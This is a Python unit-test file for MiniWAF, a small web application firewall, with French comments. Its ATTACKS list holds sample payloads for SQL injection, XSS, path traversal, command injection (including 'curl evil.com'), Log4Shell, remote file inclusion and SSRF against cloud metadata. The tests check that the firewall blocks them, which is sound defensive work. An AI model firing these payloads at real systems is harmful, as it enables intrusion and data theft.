"""Tests de MiniWAF : python3 -m unittest discover -s tests -v"""

import json
import os
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import waf  # noqa: E402
from demo_site import DemoHandler  # noqa: E402

RULES_FILE = os.path.join(ROOT, "rules.json")

ATTACKS = {
    "SQLi": ["1 UNION SELECT password FROM users", "admin' OR 1=1", "x' or 'a'='a",
             "1; DROP TABLE users", "admin'--", "1 AND sleep(5)", "1/**/UNION/**/SELECT/**/1"],
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "%253Cscript%253E", "&lt;script&gt;alert(1)"],
    "Path traversal": ["../../etc/passwd", "..\\..\\boot.ini", "/etc/shadow"],
    "Command injection": ["127.0.0.1; cat /etc/hosts", "x | whoami", "$(id)", "a && curl evil.com"],
    "Log4Shell": ["${jndi:ldap://evil.com/a}"],
    "LFI/RFI": ["php://filter/resource=index", "page=http://evil.com/shell.txt"],
    "SSRF": ["url=http://169.254.169.254/latest/meta-data/"],
}

LEGIT = ["switch cisco 24 ports", "O'Neil", "C'est l'ete !", "1+1=2", "rock & roll",
         "q=routeur&id=3&tri=prix", "select a product", "jean.dupont@mail.fr", "prix < 100 euros",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0"]


class TestNormalize(unittest.TestCase):
    def test_double_url_encoding(self):
        self.assertEqual(waf.normalize("%253Cscript%253E"), "<script>")

    def test_html_entities(self):
        self.assertEqual(waf.normalize("&lt;b&gt;"), "<b>")

    def test_sql_comments(self):
        self.assertEqual(waf.normalize("UNION/**/SELECT"), "UNION SELECT")

    def test_null_bytes(self):
        self.assertEqual(waf.normalize("ab%00c"), "abc")


class TestCards(unittest.TestCase):
    def test_luhn(self):
        self.assertTrue(waf.luhn_ok("4111111111111111"))
        self.assertFalse(waf.luhn_ok("4111111111111112"))

    def test_mask_valid_cards(self):
        text, count = waf.mask_cards("Visa 4111 1111 1111 1111 et MC 5555-5555-5555-4444")
        self.assertEqual(count, 2)
        self.assertNotIn("4111 1111 1111 1111", text)
        self.assertIn("**** **** **** 1111", text)

    def test_keep_invalid_numbers(self):
        text, count = waf.mask_cards("Commande 1234567890123")
        self.assertEqual(count, 0)
        self.assertIn("1234567890123", text)


class TestRules(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = waf.RuleSet(RULES_FILE)

    def test_attacks_are_blocked(self):
        for category, payloads in ATTACKS.items():
            for payload in payloads:
                with self.subTest(payload=payload):
                    score, matches = self.rules.scan({"url": payload})
                    self.assertGreaterEqual(score, 5, f"non bloque : {payload}")
                    self.assertIn(category, {m["category"] for m in matches})

    def test_no_false_positive(self):
        for text in LEGIT:
            with self.subTest(text=text):
                score, matches = self.rules.scan({"url": text})
                self.assertLess(score, 5, f"faux positif : {text} -> {matches}")

    def test_weak_rule_stays_under_threshold(self):
        score, matches = self.rules.scan({"url": "information_schema"})
        self.assertEqual(score, 3)
        self.assertEqual(len(matches), 1)

    def test_scores_add_up(self):
        score, _ = self.rules.scan({"url": "information_schema", "body": "concat(a)"})
        self.assertGreaterEqual(score, 5)

    def test_traps(self):
        self.assertTrue(self.rules.is_trap("/.env"))
        self.assertTrue(self.rules.is_trap("/.git/config"))
        self.assertTrue(self.rules.is_trap("/%2Egit/config"))   # contournement par encodage
        self.assertTrue(self.rules.is_trap("/WP-ADMIN/"))
        self.assertFalse(self.rules.is_trap("/search"))

    def test_response_leaks(self):
        leaks = ["You have an error in your SQL syntax", "root:x:0:0:root:/root:/bin/bash",
                 "-----BEGIN RSA PRIVATE KEY-----", "Traceback (most recent call last):",
                 "key=AKIAIOSFODNN7EXAMPLE"]
        for text in leaks:
            with self.subTest(text=text):
                self.assertIsNotNone(self.rules.scan_response(text))
        self.assertIsNone(self.rules.scan_response("<h1>Bienvenue sur la boutique</h1>"))

    def test_scanner_detection(self):
        self.assertEqual(self.rules.check_agent("sqlmap/1.7#stable"), "sqlmap")
        self.assertIsNone(self.rules.check_agent("Mozilla/5.0"))


class TestState(unittest.TestCase):
    def setUp(self):
        config = waf.load_config()
        config["rate_limit"] = {"requests": 3, "window": 60}
        config["ban"] = {"strikes": 2, "duration": 60, "max_duration": 200}
        self.tmp = tempfile.TemporaryDirectory()
        config["ban_file"] = os.path.join(self.tmp.name, "bans.json")
        self.config = config
        self.state = waf.State(config)

    def tearDown(self):
        self.tmp.cleanup()

    def test_rate_limit(self):
        results = [self.state.rate_exceeded("1.2.3.4") for _ in range(4)]
        self.assertEqual(results, [False, False, False, True])

    def test_ban(self):
        self.assertEqual(self.state.add_strike("1.2.3.4", ["XSS"]), 0)
        self.assertEqual(self.state.add_strike("1.2.3.4", ["XSS"]), 60)
        self.assertTrue(self.state.is_banned("1.2.3.4"))
        self.assertFalse(self.state.is_banned("5.6.7.8"))

    def test_progressive_ban(self):
        # 60s, puis 120s, puis plafonne a 200s
        self.assertEqual([self.state.ban("1.2.3.4") for _ in range(3)], [60, 120, 200])

    def test_bans_persist_after_restart(self):
        self.state.ban("1.2.3.4")
        restarted = waf.State(self.config)
        self.assertTrue(restarted.is_banned("1.2.3.4"))
        self.assertEqual(restarted.ban_counts["1.2.3.4"], 1)

    def test_metrics_format(self):
        self.state.count("blocked")
        self.state.add_strike("1.2.3.4", ["XSS"])
        metrics = self.state.metrics()
        self.assertIn('miniwaf_events_total{type="blocked"} 1', metrics)
        self.assertIn('miniwaf_attacks_total{category="XSS"} 1', metrics)


class TestIntegration(unittest.TestCase):
    """Lance un vrai backend et un vrai WAF sur des ports libres."""

    @classmethod
    def setUpClass(cls):
        cls.backend = HTTPServer(("127.0.0.1", 0), DemoHandler)
        threading.Thread(target=cls.backend.serve_forever, daemon=True).start()

        cls.tmp = tempfile.TemporaryDirectory()
        config = waf.load_config()
        config.update(port=0, backend=f"http://127.0.0.1:{cls.backend.server_address[1]}",
                      dashboard_token="secret-test", ban={"strikes": 3, "duration": 60},
                      log_file=os.path.join(cls.tmp.name, "waf.log"),
                      ban_file=os.path.join(cls.tmp.name, "bans.json"))
        logger = waf.setup_logger(config["log_file"], console=False)
        cls.waf = waf.WAFServer(config, waf.RuleSet(RULES_FILE, logger), logger)
        threading.Thread(target=cls.waf.serve_forever, daemon=True).start()
        cls.url = f"http://127.0.0.1:{cls.waf.server_address[1]}"
        cls.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    @classmethod
    def tearDownClass(cls):
        cls.waf.shutdown()
        cls.backend.shutdown()
        cls.waf.server_close()
        cls.backend.server_close()
        cls.tmp.cleanup()

    def setUp(self):
        # Chaque test repart d'un etat propre (pas de ban herite du test precedent)
        state = self.waf.state
        with state.lock:
            state.banned.clear()
            state.strikes.clear()

    def get(self, path, data=None, headers=None, method=None):
        req = urllib.request.Request(self.url + path, data=data, headers=headers or {}, method=method)
        try:
            with self.opener.open(req) as r:
                return r.status, r.read().decode(), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(), e.headers

    def test_1_legit_request(self):
        status, body, headers = self.get("/search?q=switch")
        self.assertEqual(status, 200)
        self.assertIn("switch", body)
        self.assertEqual(len(headers["X-Request-ID"]), 12)
        self.assertEqual(headers["X-Frame-Options"], "DENY")
        self.assertIsNone(headers["X-Powered-By"])
        self.assertNotIn("Apache", headers.get("Server", ""))

    def test_2_backend_error_hidden(self):
        status, body, _ = self.get("/error")
        self.assertEqual(status, 500)
        self.assertNotIn("Traceback", body)

    def test_3_smuggling_refused(self):
        status, _, _ = self.get("/login", data=b"x", headers={"Transfer-Encoding": "chunked"})
        self.assertEqual(status, 400)

    def test_4_dashboard_requires_token(self):
        self.assertEqual(self.get("/__waf/api")[0], 403)
        self.assertEqual(self.get("/__waf/api?token=mauvais")[0], 403)
        status, body, _ = self.get("/__waf/api", headers={"X-WAF-Token": "secret-test"})
        self.assertEqual(status, 200)
        self.assertIn("stats", json.loads(body))

    def test_5_attack_blocked(self):
        status, body, _ = self.get("/search?q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertEqual(status, 403)
        self.assertIn("XSS", body)

    def test_6_method_not_allowed(self):
        status, _, headers = self.get("/", method="TRACE")
        self.assertEqual(status, 405)
        self.assertIn("GET", headers["Allow"])

    def test_7_url_too_long(self):
        self.assertEqual(self.get("/search?q=" + "a" * 3000)[0], 414)

    def test_8_response_leak_blocked(self):
        status, body, _ = self.get("/product?id=abc")
        self.assertEqual(status, 500)
        self.assertNotIn("SQL syntax", body)
        self.assertEqual(self.get("/product?id=3")[0], 200)

    def test_8_cards_masked(self):
        status, body, _ = self.get("/orders")
        self.assertEqual(status, 200)
        self.assertNotIn("4111 1111 1111 1111", body)
        self.assertNotIn("5555-5555-5555-4444", body)
        self.assertIn("**** **** **** 4444", body)
        self.assertIn("1234567890123", body)   # pas une carte valide : non masque

    def test_8_metrics(self):
        self.assertEqual(self.get("/__waf/metrics")[0], 403)
        status, body, _ = self.get("/__waf/metrics", headers={"X-WAF-Token": "secret-test"})
        self.assertEqual(status, 200)
        self.assertIn("miniwaf_uptime_seconds", body)

    def test_8_unban(self):
        self.waf.state.ban("127.0.0.1")
        self.assertEqual(self.get("/")[0], 403)
        token = {"X-WAF-Token": "secret-test"}
        self.assertEqual(self.get("/__waf/unban?ip=127.0.0.1", headers=token)[0], 405)  # GET refuse
        status, body, _ = self.get("/__waf/unban?ip=127.0.0.1", data=b"", headers=token, method="POST")
        self.assertEqual(status, 200)
        self.assertTrue(json.loads(body)["was_banned"])
        self.assertEqual(self.get("/")[0], 200)

    def test_9_ban(self):
        for _ in range(3):
            self.get("/file?name=../../etc/passwd")
        status, body, _ = self.get("/")
        self.assertEqual(status, 403)
        self.assertIn("bannie", body)

    def test_9_trap(self):
        status, body, _ = self.get("/.env")
        self.assertEqual(status, 404)            # l'attaquant croit que la page n'existe pas...
        self.assertNotIn("MiniWAF", body)
        status, _, _ = self.get("/")
        self.assertEqual(status, 403)            # ...mais il est banni


if __name__ == "__main__":
    unittest.main(verbosity=2)
